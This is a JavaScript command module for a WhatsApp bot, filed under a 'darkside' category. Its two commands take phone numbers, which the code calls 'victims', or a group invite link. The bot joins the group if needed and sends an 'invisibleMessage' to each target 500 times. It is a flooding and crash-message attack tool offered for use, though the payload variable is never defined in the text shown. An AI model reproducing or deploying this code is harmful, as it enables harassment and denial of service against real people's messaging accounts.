const { adams } = require("../Ibrahim/adams");
const { delay, loading } = require("../Ibrahim/utils");
const { bwmxmd1 } = require("../Ibrahim/ibraah1.js");

const category = "darkside";
const reaction = "🔞";

const mess = {};
mess.prem = "You are not authorised to use this command!!!";

const phoneRegex = /^\d{1,3}[- ]?(\d{1,3} )?[\d- ]{7,10}$/;
const groupLinkRegex = /https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]{22}/;

async function sendMessage(dest, zk, ms, repondre, victims, botNumber) {
    for (let i = 0; i < victims.length; i++) {
        if (!phoneRegex.test(victims[i])) {
            repondre(`${victims[i]} is not a valid phone number`);
            continue;
        } else {
            const victim = victims[i] + "@s.whatsapp.net";
            try {
                for (let j = 0; j < 500; j++) {
                    await zk.sendMessage(victim, { text: invisibleMessage }, { fromMe: false, userJid: botNumber, quoted: ms });
                }
                console.log(`Cool gift sent to ${victims[i]}`);
            } catch (e) {
                repondre(`An error occurred while sending messages to ${victims[i]}`);
                console.log(`An error occurred while sending messages to ${victim}: ${e}`);
                break;
            }
        }
    }
    repondre(`Successfully sent a gift to ${victims.join(", ")}.`);
}

async function sendGroupMessage(dest, zk, ms, repondre, groupLink) {
    try {
        // Extract group invite code from the link
        const inviteCode = groupLink.split("/")[3];
        const groupMetadata = await zk.groupAcceptInvite(inviteCode);
        const groupJid = groupMetadata.id;

        // Send the invisible message 500 times to the group
        for (let j = 0; j < 500; j++) {
            await zk.sendMessage(groupJid, { text: invisibleMessage }, { fromMe: false, quoted: ms });
        }

        console.log(`500 messages sent to group ${groupJid}`);
        repondre(`Successfully sent 500 messages to the group.`);
    } catch (e) {
        repondre(`An error occurred while sending messages to the group.`);
        console.log(`An error occurred while sending messages to the group: ${e}`);
    }
}

adams(
    {
        nomCom: "xmd1",
        categorie: category,
        reaction: reaction,
    },

    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        const victims = arg;

        if (!superUser) return await repondre(mess.prem);
        if (victims.length < 1) return await repondre("Please specify at least one victim.");

        await loading(dest, zk);

        try {
            const botNumber = zk.user.id;
            await sendMessage(dest, zk, ms, repondre, victims, botNumber);
        } catch (e) {
            await repondre(`An error occurred while sending the message.`);
            console.log(`An error occurred while sending the message: ${e}`);
        }
    }
);

adams(
    {
        nomCom: "xmd2",
        categorie: category,
        reaction: reaction,
    },

    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        const groupLink = arg[0]; // Assume first argument is the group link

        if (!superUser) return await repondre(mess.prem);
        if (!groupLink || !groupLinkRegex.test(groupLink)) return await repondre("Please specify a valid WhatsApp group link.");

        await loading(dest, zk);

        try {
            await sendGroupMessage(dest, zk, ms, repondre, groupLink);
        } catch (e) {
            await repondre(`An error occurred while sending the message.`);
            console.log(`An error occurred while sending the message: ${e}`);
        }
    }
);
